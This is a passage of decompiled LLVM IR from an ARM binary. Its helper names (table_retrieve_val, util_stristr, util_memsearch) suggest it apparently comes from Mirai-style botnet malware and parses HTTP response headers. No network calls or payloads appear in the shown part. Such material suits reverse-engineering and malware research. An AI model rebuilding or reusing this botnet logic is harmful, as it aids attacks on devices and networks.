  %v2_90c4 = load i32, i32* @sl, align 4
  %v3_90c4 = inttoptr i32 %v2_90c4 to i32*
  store i32 2, i32* %v3_90c4, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_9080, %bb182
  %v0_90c8 = load i32, i32* @r5, align 4
  store i32 %v0_90c8, i32* %r1.global-to-local, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_90d0 = inttoptr i32 %v0_90c8 to i32*
  %v3_90d0 = call i32 @table_retrieve_val(i32 48, i32* %v2_90d0)
  %v0_90d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_90d4, i32* @r1, align 4
  store i32 %v3_90d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_90e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_90d4, i32 %v3_90d0)
  store i32 %v4_90e0, i32* %r0.global-to-local, align 4
  %v2_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v2_90e4, i1* %cpsr_c.global-to-local, align 1
  %v7_90e4 = icmp eq i32 %v4_90e0, -1
  store i1 %v7_90e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_90e4, label %.thread24, label %bb183

bb183:                                            ; preds = %.thread23
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_90ec = load i32, i32* @sl, align 4
  %v3_90ec = inttoptr i32 %v2_90ec to i32*
  store i32 1, i32* %v3_90ec, align 4
  br label %.thread24

.thread24:                                        ; preds = %.thread23, %bb183
  %v0_90f0 = load i32, i32* @r5, align 4
  store i32 %v0_90f0, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_90f8 = load i32, i32* @sl, align 4
  %v2_90f8 = add i32 %v1_90f8, 4
  %v3_90f8 = inttoptr i32 %v2_90f8 to i32*
  store i32 %v0_90f0, i32* %v3_90f8, align 4
  %v2_90fc = inttoptr i32 %v0_90f0 to i32*
  %v3_90fc = call i32 @table_retrieve_val(i32 47, i32* %v2_90fc)
  %v0_9100 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9100, i32* @r1, align 4
  store i32 %v3_90fc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_910c = call i32 @util_stristr(i8* %tmp168, i32 %v0_9100, i32 %v3_90fc)
  store i32 %v4_910c, i32* %r0.global-to-local, align 4
  %v2_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v2_9110, i1* %cpsr_c.global-to-local, align 1
  %v7_9110 = icmp eq i32 %v4_910c, -1
  store i1 %v7_9110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9110, label %.thread25, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %.thread24
  %v0_9118 = load i32, i32* @r5, align 4
  store i32 %v0_9118, i32* %r1.global-to-local, align 4
  store i32 47, i32* %r0.global-to-local, align 4
  %v2_9120 = inttoptr i32 %v0_9118 to i32*
  %v3_9120 = call i32 @table_retrieve_val(i32 47, i32* %v2_9120)
  %v0_9124 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9124, i32* @r1, align 4
  store i32 %v3_9120, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9130 = call i32 @util_stristr(i8* %tmp168, i32 %v0_9124, i32 %v3_9120)
  store i32 %v4_9130, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9138 = add i32 %v4_9130, %v2_827c
  %v3_9138 = inttoptr i32 %v2_9138 to i8*
  %v4_9138 = load i8, i8* %v3_9138, align 1
  %v2_9140 = icmp ugt i8 %v4_9138, 31
  store i1 %v2_9140, i1* %cpsr_c.global-to-local, align 1
  %v7_9140 = icmp eq i8 %v4_9138, 32
  store i1 %v7_9140, i1* %cpsr_z.global-to-local, align 1
  %v2_9148 = zext i1 %v7_9140 to i32
  %v2_9148.v4_9130 = add i32 %v2_9148, %v4_9130
  store i32 %v2_9148.v4_9130, i32* @r4, align 4
  %v2_914c = add i32 %v2_9148.v4_9130, %v2_827c
  store i32 %v2_914c, i32* @r6, align 4
  store i32 %v2_914c, i32* %r0.global-to-local, align 4
  %v1_9154 = load i32, i32* %fp.global-to-local, align 4
  %v2_9154 = sub i32 %v1_9154, %v2_9148.v4_9130
  store i32 %v2_9154, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9160 = call i32 @util_memsearch(i32 %v2_914c, i32 %v2_9154, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_9160, i32* %r0.global-to-local, align 4
  %v2_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v2_9164, i1* %cpsr_c.global-to-local, align 1
  %v7_9164 = icmp eq i32 %v5_9160, -1
  store i1 %v7_9164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9164, label %.thread25, label %dec_label_pc_916c

dec_label_pc_916c:                                ; preds = %dec_label_pc_9118
  %v2_916c = icmp ne i32 %v5_9160, 0
  store i1 %v2_916c, i1* %cpsr_c.global-to-local, align 1
  %v7_916c = icmp eq i32 %v5_9160, 1
  store i1 %v7_916c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9174 = icmp slt i32 %v5_9160, 2
  br i1 %v7_9174, label %bb185, label %bb184

bb184:                                            ; preds = %dec_label_pc_916c
  %v9_9174 = add i32 %v5_9160, -2
  store i32 %v9_9174, i32* %r0.global-to-local, align 4
  br label %bb185

bb185:                                            ; preds = %dec_label_pc_916c, %bb184
  %v1_917c = phi i32 [ %v5_9160, %dec_label_pc_916c ], [ %v9_9174, %bb184 ]
  store i32 %v2_8710, i32* %r2.global-to-local, align 4
  %v2_917c = add i32 %v1_917c, %v2_8710
  %v1_9180 = load i32, i32* @r4, align 4
  %v2_9180 = add i32 %v2_917c, %v1_9180
  store i32 %v2_9180, i32* %r3.global-to-local, align 4
  %v0_9184 = load i32, i32* @r5, align 4
  %v1_9184 = trunc i32 %v0_9184 to i8
  %v3_9184 = load i32, i32* @r7, align 4
  %v4_9184 = add i32 %v3_9184, %v2_9180
  %v5_9184 = inttoptr i32 %v4_9184 to i8*
  store i8 %v1_9184, i8* %v5_9184, align 1
  %v0_9188 = load i32, i32* @r6, align 4
  store i32 %v0_9188, i32* %r0.global-to-local, align 4
  %v1_918c = inttoptr i32 %v0_9188 to i8*
  %v2_918c = call i32 @util_strlen(i8* %v1_918c)
  %v0_9190 = load i32, i32* @r5, align 4
  store i32 %v0_9190, i32* %r1.global-to-local, align 4
  store i32 %v2_918c, i32* @r4, align 4
  store i32 46, i32* %r0.global-to-local, align 4
  %v2_919c = inttoptr i32 %v0_9190 to i32*
  %v3_919c = call i32 @table_retrieve_val(i32 46, i32* %v2_919c)
  %v0_91a0 = load i32, i32* @r4, align 4
  store i32 %v0_91a0, i32* @r1, align 4
  store i32 %v3_919c, i32* %r2.global-to-local, align 4
  %v0_91a8 = load i32, i32* @r6, align 4
  store i32 %v0_91a8, i32* %r0.global-to-local, align 4
  %v3_91ac = inttoptr i32 %v0_91a8 to i8*
  %v4_91ac = call i32 @util_stristr(i8* %v3_91ac, i32 %v0_91a0, i32 %v3_919c)
  store i32 %v4_91ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_91b0 = icmp eq i32 %v4_91ac, 0
  store i1 %v2_91b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_91b0, label %.thread25, label %bb186

bb186:                                            ; preds = %bb185
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_91b8 = load i32, i32* @sl, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i32*
  store i32 1, i32* %v4_91b8, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb185, %dec_label_pc_9118, %.thread24, %bb186
  store i32 0, i32* @r7, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_91c8 = load i32, i32* @sl, align 4
  %v2_91c8 = add i32 %v1_91c8, 8
  %v3_91c8 = inttoptr i32 %v2_91c8 to i32*
  store i32 0, i32* %v3_91c8, align 4
  %v3_91cc = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91d0, i32* @r1, align 4
  store i32 %v3_91cc, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_91dc = call i32 @util_stristr(i8* %tmp168, i32 %v0_91d0, i32 %v3_91cc)
  store i32 %v4_91dc, i32* %r0.global-to-local, align 4
  %v2_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v2_91e4, i1* %cpsr_c.global-to-local, align 1
  %v7_91e4 = icmp eq i32 %v4_91dc, -1
  store i1 %v7_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_91e4, label %.thread26, label %dec_label_pc_91f0

dec_label_pc_91f0:                                ; preds = %.thread25
  %v0_91f0 = load i32, i32* @r7, align 4
  store i32 %v0_91f0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v2_91f8 = inttoptr i32 %v0_91f0 to i32*
  %v3_91f8 = call i32 @table_retrieve_val(i32 44, i32* %v2_91f8)
  %v0_91fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_91fc, i32* @r1, align 4
  store i32 %v3_91f8, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9208 = call i32 @util_stristr(i8* %tmp168, i32 %v0_91fc, i32 %v3_91f8)
  store i32 %v4_9208, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %ip.global-to-local, align 4
  %v2_9210 = add i32 %v4_9208, %v2_827c
  %v3_9210 = inttoptr i32 %v2_9210 to i8*
  %v4_9210 = load i8, i8* %v3_9210, align 1
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9218 = icmp ugt i8 %v4_9210, 31
  store i1 %v2_9218, i1* %cpsr_c.global-to-local, align 1
  %v7_9218 = icmp eq i8 %v4_9210, 32
  store i1 %v7_9218, i1* %cpsr_z.global-to-local, align 1
  %v2_9220 = zext i1 %v7_9218 to i32
  %v2_9220.v4_9208 = add i32 %v2_9220, %v4_9208
  store i32 %v2_9220.v4_9208, i32* @r4, align 4
  %v2_9224 = add i32 %v2_9220.v4_9208, %v2_827c
  store i32 %v2_9224, i32* @r5, align 4
  store i32 %v2_9224, i32* %r0.global-to-local, align 4
  %v1_922c = load i32, i32* %fp.global-to-local, align 4
  %v2_922c = sub i32 %v1_922c, %v2_9220.v4_9208
  store i32 %v2_922c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9238 = call i32 @util_memsearch(i32 %v2_9224, i32 %v2_922c, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_9238, i32* %r0.global-to-local, align 4
  %v2_923c = icmp eq i32 %v5_9238, -1
  store i1 %v2_923c, i1* %cpsr_c.global-to-local, align 1
  %v7_923c = icmp eq i32 %v5_9238, -1
  store i1 %v7_923c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_923c, label %.thread26, label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_91f0
  %v2_9244 = icmp ne i32 %v5_9238, 0
  store i1 %v2_9244, i1* %cpsr_c.global-to-local, align 1
  %v7_9244 = icmp eq i32 %v5_9238, 1
  store i1 %v7_9244, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r1.global-to-local, align 4
  %v7_924c = icmp slt i32 %v5_9238, 2
  br i1 %v7_924c, label %bb188, label %bb187

bb187:                                            ; preds = %dec_label_pc_9244
  %v9_924c = add i32 %v5_9238, -2
  store i32 %v9_924c, i32* %r0.global-to-local, align 4
  br label %bb188

bb188:                                            ; preds = %dec_label_pc_9244, %bb187
  %v1_9254 = phi i32 [ %v5_9238, %dec_label_pc_9244 ], [ %v9_924c, %bb187 ]
  store i32 %v2_8710, i32* %r1.global-to-local, align 4
  %v2_9254 = add i32 %v1_9254, %v2_8710
  %v1_9258 = load i32, i32* @r4, align 4
  %v2_9258 = add i32 %v2_9254, %v1_9258
  store i32 %v2_9258, i32* %r3.global-to-local, align 4
  %v0_925c = load i32, i32* @r7, align 4
  %v1_925c = trunc i32 %v0_925c to i8
  %v3_925c = load i32, i32* @r6, align 4
  %v4_925c = add i32 %v3_925c, %v2_9258
  %v5_925c = inttoptr i32 %v4_925c to i8*
  store i8 %v1_925c, i8* %v5_925c, align 1
  %v0_9260 = load i32, i32* @r5, align 4
  store i32 %v0_9260, i32* %r0.global-to-local, align 4
  %v1_9264 = inttoptr i32 %v0_9260 to i8*
  %v2_9264 = call i32 @util_strlen(i8* %v1_9264)
  %v0_9268 = load i32, i32* @r7, align 4
  store i32 %v0_9268, i32* %r1.global-to-local, align 4
  store i32 %v2_9264, i32* @r4, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v2_9274 = inttoptr i32 %v0_9268 to i32*
  %v3_9274 = call i32 @table_retrieve_val(i32 45, i32* %v2_9274)
  %v0_9278 = load i32, i32* @r4, align 4
  store i32 %v0_9278, i32* @r1, align 4
  store i32 %v3_9274, i32* %r2.global-to-local, align 4
  %v0_9280 = load i32, i32* @r5, align 4
  store i32 %v0_9280, i32* %r0.global-to-local, align 4
  %v3_9284 = inttoptr i32 %v0_9280 to i8*
  %v4_9284 = call i32 @util_stristr(i8* %v3_9284, i32 %v0_9278, i32 %v3_9274)
  store i32 %v4_9284, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9288 = icmp eq i32 %v4_9284, 0
  store i1 %v2_9288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9288, label %.thread26, label %bb189

bb189:                                            ; preds = %bb188
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9290 = load i32, i32* @sl, align 4
  %v3_9290 = add i32 %v2_9290, 8
  %v4_9290 = inttoptr i32 %v3_9290 to i32*
  store i32 1, i32* %v4_9290, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb188, %dec_label_pc_91f0, %.thread25, %bb189
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_929c = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_92a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92a0, i32* @r1, align 4
  store i32 %v3_929c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92ac = call i32 @util_stristr(i8* %tmp168, i32 %v0_92a0, i32 %v3_929c)
  store i32 %v4_92ac, i32* %r0.global-to-local, align 4
  %v2_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v2_92b0, i1* %cpsr_c.global-to-local, align 1
  %v7_92b0 = icmp eq i32 %v4_92ac, -1
  store i1 %v7_92b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_92b0, label %.thread, label %dec_label_pc_92c8

.thread:                                          ; preds = %.thread26
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @sl, align 4
  %v3_92c0 = add i32 %v2_92c0, 12
  %v4_92c0 = inttoptr i32 %v3_92c0 to i32*
  store i32 0, i32* %v4_92c0, align 4
  br label %dec_label_pc_934c

dec_label_pc_92c8:                                ; preds = %.thread26
  store i32 -20773, i32* @r6, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 43, i32* %r0.global-to-local, align 4
  %v3_92d0 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_92d4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_92d4, i32* @r1, align 4
  store i32 %v3_92d0, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_92e0 = call i32 @util_stristr(i8* %tmp168, i32 %v0_92d4, i32 %v3_92d0)
  store i32 %v4_92e0, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* %r2.global-to-local, align 4
  %v2_92e8 = add i32 %v4_92e0, %v2_827c
  %v3_92e8 = inttoptr i32 %v2_92e8 to i8*
  %v4_92e8 = load i8, i8* %v3_92e8, align 1
  %v2_92ec = icmp ugt i8 %v4_92e8, 31
  store i1 %v2_92ec, i1* %cpsr_c.global-to-local, align 1
  %v7_92ec = icmp eq i8 %v4_92e8, 32
  store i1 %v7_92ec, i1* %cpsr_z.global-to-local, align 1
  %v2_92f8 = zext i1 %v7_92ec to i32
  %v2_92f8.v4_92e0 = add i32 %v2_92f8, %v4_92e0
  store i32 %v2_92f8.v4_92e0, i32* @r4, align 4
  %v2_92fc = add i32 %v2_92f8.v4_92e0, %v2_827c
  store i32 %v2_92fc, i32* @r5, align 4
  store i32 %v2_92fc, i32* %r0.global-to-local, align 4
  %v1_9304 = load i32, i32* %fp.global-to-local, align 4
  %v2_9304 = sub i32 %v1_9304, %v2_92f8.v4_92e0
  store i32 %v2_9304, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_9310 = call i32 @util_memsearch(i32 %v2_92fc, i32 %v2_9304, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_9310, i32* %r0.global-to-local, align 4
  %v2_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v2_9314, i1* %cpsr_c.global-to-local, align 1
  %v7_9314 = icmp eq i32 %v5_9310, -1
  store i1 %v7_9314, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9314, label %dec_label_pc_934c, label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_92c8
  %v2_931c = icmp ne i32 %v5_9310, 0
  store i1 %v2_931c, i1* %cpsr_c.global-to-local, align 1
  %v7_931c = icmp eq i32 %v5_9310, 1
  store i1 %v7_931c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_9324 = icmp slt i32 %v5_9310, 2
  br i1 %v7_9324, label %bb191, label %bb190

bb190:                                            ; preds = %dec_label_pc_931c
  %v9_9324 = add i32 %v5_9310, -2
  store i32 %v9_9324, i32* %r0.global-to-local, align 4
  br label %bb191

bb191:                                            ; preds = %dec_label_pc_931c, %bb190
  %v1_932c = phi i32 [ %v5_9310, %dec_label_pc_931c ], [ %v9_9324, %bb190 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_932c = add i32 %v1_932c, %v2_8710
  %v1_9330 = load i32, i32* @r4, align 4
  %v2_9330 = add i32 %v2_932c, %v1_9330
  store i32 %v2_9330, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9338 = load i32, i32* @r5, align 4
  store i32 %v0_9338, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_9340 = load i32, i32* @r6, align 4
  %v4_9340 = add i32 %v3_9340, %v2_9330
  %v5_9340 = inttoptr i32 %v4_9340 to i8*
  store i8 0, i8* %v5_9340, align 1
  %v2_9344 = inttoptr i32 %v0_9338 to i8*
  %v3_9344 = call i32 @util_atoi(i8* %v2_9344, i32 10)
  store i32 %v3_9344, i32* %r0.global-to-local, align 4
  %v1_9348 = load i32, i32* @sl, align 4
  %v2_9348 = add i32 %v1_9348, 12
  %v3_9348 = inttoptr i32 %v2_9348 to i32*
  store i32 %v3_9344, i32* %v3_9348, align 4
  br label %dec_label_pc_934c

dec_label_pc_934c:                                ; preds = %.thread, %dec_label_pc_92c8, %bb191
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9350:                                ; preds = %dec_label_pc_951c, %dec_label_pc_949c, %dec_label_pc_934c
  %v1_935c = phi i32 [ 0, %dec_label_pc_934c ], [ %v0_949c, %dec_label_pc_949c ], [ %v1_935c.pre.pre, %dec_label_pc_951c ]
  store i32 %v2_827c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v2_935c = add i32 %v1_935c, %v2_827c
  store i32 %v2_935c, i32* @r4, align 4
  %v3_9360 = call i32 @table_retrieve_val(i32 42, i32* null)
  %v0_9364 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9364, i32* @r1, align 4
  store i32 %v3_9360, i32* %r2.global-to-local, align 4
  %v0_936c = load i32, i32* @r4, align 4
  store i32 %v0_936c, i32* %r0.global-to-local, align 4
  %v3_9370 = inttoptr i32 %v0_936c to i8*
  %v4_9370 = call i32 @util_stristr(i8* %v3_9370, i32 %v0_9364, i32 %v3_9360)
  store i32 %v4_9370, i32* %r0.global-to-local, align 4
  store i32 -20773, i32* %ip.global-to-local, align 4
  %v2_937c = icmp eq i32 %v4_9370, -1
  store i1 %v2_937c, i1* %cpsr_c.global-to-local, align 1
  %v7_937c = icmp eq i32 %v4_9370, -1
  store i1 %v7_937c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_937c, label %dec_label_pc_9588, label %dec_label_pc_9388

dec_label_pc_9388:                                ; preds = %dec_label_pc_9350
  %v0_9388 = load i32, i32* @sl, align 4
  %v1_9388 = add i32 %v0_9388, 16
  %v2_9388 = inttoptr i32 %v1_9388 to i32*
  %v3_9388 = load i32, i32* %v2_9388, align 4
  store i32 %v3_9388, i32* %r3.global-to-local, align 4
  %v2_938c = icmp ugt i32 %v3_9388, 3
  store i1 %v2_938c, i1* %cpsr_c.global-to-local, align 1
  %v7_938c = icmp eq i32 %v3_9388, 4
  store i1 %v7_938c, i1* %cpsr_z.global-to-local, align 1
  %v8_9390 = icmp sgt i32 %v3_9388, 4
  br i1 %v8_9390, label %dec_label_pc_9588, label %dec_label_pc_9394

dec_label_pc_9394:                                ; preds = %dec_label_pc_9388
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 42, i32* %r0.global-to-local, align 4
  %v3_939c = call i32 @table_retrieve_val(i32 42, i32* null)
  %v0_93a0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_93a0, i32* @r1, align 4
  store i32 %v3_939c, i32* %r2.global-to-local, align 4
  %v0_93a8 = load i32, i32* @r4, align 4
  store i32 %v0_93a8, i32* %r0.global-to-local, align 4
  %v3_93ac = inttoptr i32 %v0_93a8 to i8*
  %v4_93ac = call i32 @util_stristr(i8* %v3_93ac, i32 %v0_93a0, i32 %v3_939c)
  store i32 %v4_93ac, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v1_93b4 = load i32, i32* @r5, align 4
  %v2_93b4 = add i32 %v1_93b4, %v4_93ac
  store i32 %v2_93b4, i32* @r8, align 4
  %v2_93b8 = add i32 %v2_93b4, %v2_827c
  %v3_93b8 = inttoptr i32 %v2_93b8 to i8*
  %v4_93b8 = load i8, i8* %v3_93b8, align 1
  %v6_93b8 = zext i8 %v4_93b8 to i32
  store i32 %v6_93b8, i32* %r3.global-to-local, align 4
  %v2_93bc = icmp ugt i8 %v4_93b8, 31
  store i1 %v2_93bc, i1* %cpsr_c.global-to-local, align 1
  %v7_93bc = icmp eq i8 %v4_93b8, 32
  store i1 %v7_93bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_93bc, label %bb192, label %bb193

bb192:                                            ; preds = %dec_label_pc_9394
  %v2_93c0 = add i32 %v4_93ac, 1
  store i32 %v2_93c0, i32* %r0.global-to-local, align 4
  br label %bb193

bb193:                                            ; preds = %dec_label_pc_9394, %bb192
  %v1_93d0 = phi i32 [ %v4_93ac, %dec_label_pc_9394 ], [ %v2_93c0, %bb192 ]
  %v1_93c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_93c4 = sub i32 %v1_93c4, %v1_93b4
  store i32 %v2_93c4, i32* %r3.global-to-local, align 4
  %v2_93c8 = sub i32 %v2_93c4, %v1_93d0
  store i32 %v2_93c8, i32* @r7, align 4
  %v0_93cc = load i32, i32* @r4, align 4
  %v2_93cc = add i32 %v0_93cc, %v1_93d0
  store i32 %v2_93cc, i32* @r6, align 4
  br i1 %v7_93bc, label %bb194, label %bb195

bb194:                                            ; preds = %bb193
  %v3_93d0 = add i32 %v1_93d0, %v1_93b4
  store i32 %v3_93d0, i32* @r8, align 4
  br label %bb195

bb195:                                            ; preds = %bb193, %bb194
  store i32 %v2_93c8, i32* %r1.global-to-local, align 4
  store i32 %v2_93cc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_93e4 = call i32 @util_memsearch(i32 %v2_93cc, i32 %v2_93c8, i32 ptrtoint ([3 x i8]* @global_var_1b35c.43 to i32), i32 2)
  store i32 %v5_93e4, i32* %r0.global-to-local, align 4
  %v2_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v2_93e8, i1* %cpsr_c.global-to-local, align 1
  %v7_93e8 = icmp eq i32 %v5_93e4, -1
  store i1 %v7_93e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_93e4, i32* @r4, align 4
  br i1 %v7_93e8, label %dec_label_pc_949c, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %bb195
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v2_93f8 = icmp ne i32 %v5_93e4, 0
  store i1 %v2_93f8, i1* %cpsr_c.global-to-local, align 1
  %v7_93f8 = icmp eq i32 %v5_93e4, 1
  store i1 %v7_93f8, i1* %cpsr_z.global-to-local, align 1
  %v7_93fc = icmp slt i32 %v5_93e4, 2
  br i1 %v7_93fc, label %bb197, label %bb196

bb196:                                            ; preds = %dec_label_pc_93f4
  %v9_93fc = add i32 %v5_93e4, -2
  store i32 %v9_93fc, i32* @r4, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_93f4, %bb196
  %v1_9400 = load i32, i32* @r8, align 4
  %v2_9400 = add i32 %v1_9400, %v2_827c
  store i32 %v2_9400, i32* @r5, align 4
  %v0_9404 = load i32, i32* @r6, align 4
  store i32 %v0_9404, i32* %r0.global-to-local, align 4
  %v0_9408 = load i32, i32* @r7, align 4
  store i32 %v0_9408, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9414 = call i32 @util_memsearch(i32 %v0_9404, i32 %v0_9408, i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32 1)
  store i32 %v4_9414, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9418 = icmp eq i32 %v4_9414, 0
  store i1 %v2_9418, i1* %cpsr_z.global-to-local, align 1
  %tmp198 = icmp slt i32 %v4_9414, 1
  br i1 %tmp198, label %.dec_label_pc_9438_crit_edge, label %dec_label_pc_9420

.dec_label_pc_9438_crit_edge:                     ; preds = %bb197
  %v1_9440.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_9438

dec_label_pc_9420:                                ; preds = %bb197
  %v0_9420 = load i32, i32* @r6, align 4
  store i32 %v0_9420, i32* %r0.global-to-local, align 4
  %v0_9424 = load i32, i32* @r7, align 4
  store i32 %v0_9424, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_9430 = call i32 @util_memsearch(i32 %v0_9420, i32 %v0_9424, i32 ptrtoint (i32* @global_var_1b388.49 to i32), i32 1)
  store i32 %v4_9430, i32* %r0.global-to-local, align 4
  %v1_9434 = add i32 %v4_9430, -1
  store i32 %v1_9434, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %.dec_label_pc_9438_crit_edge, %dec_label_pc_9420
  %v1_9440 = phi i32 [ %v1_9440.pre, %.dec_label_pc_9438_crit_edge ], [ %v1_9434, %dec_label_pc_9420 ]
  %v2_9440 = add i32 %v1_9440, %v2_8710
  store i32 -20773, i32* @lr, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_944c = load i32, i32* @r8, align 4
  %v2_944c = add i32 %v2_9440, %v1_944c
  store i32 %v2_944c, i32* %r3.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_9454 = add i32 %v2_944c, -20773
  %v5_9454 = inttoptr i32 %v4_9454 to i8*
  store i8 0, i8* %v5_9454, align 1
  %storemerge6.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_9474.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9474

dec_label_pc_9460:                                ; preds = %dec_label_pc_9474
  br i1 %v7_9464, label %dec_label_pc_94a4, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_9460
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9474

dec_label_pc_9474:                                ; preds = %dec_label_pc_9438, %dec_label_pc_946c
  %v0_9474 = phi i32 [ %v0_9460, %dec_label_pc_946c ], [ %v0_9474.pre, %dec_label_pc_9438 ]
